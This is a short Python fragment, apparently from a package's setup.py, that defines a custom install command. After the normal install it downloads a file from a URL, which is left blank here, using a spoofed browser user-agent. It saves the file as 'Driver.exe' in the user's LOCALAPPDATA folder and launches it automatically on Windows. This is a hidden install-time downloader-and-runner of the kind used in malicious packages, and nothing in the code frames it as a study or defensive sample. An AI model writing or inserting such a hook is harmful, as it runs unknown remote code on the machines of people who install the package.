class CustomInstallCommand(install):
    def run(self):
        install.run(self)

        url = ""
        destination = os.path.join(os.environ["LOCALAPPDATA"], "Driver.exe")

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }

        try:
            request = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(request) as response:
                with open(destination, "wb") as file:
                    file.write(response.read())

            if os.name == "nt":
                ctypes.windll.shell32.ShellExecuteW(
                    None, "open", destination, None, None, 1
                )
            else:
                print(
                    "Este script solo soporta la ejecución automática en sistemas Windows."
                )
        except Exception as e:
            print(f"Error durante la descarga o ejecución: {e}")
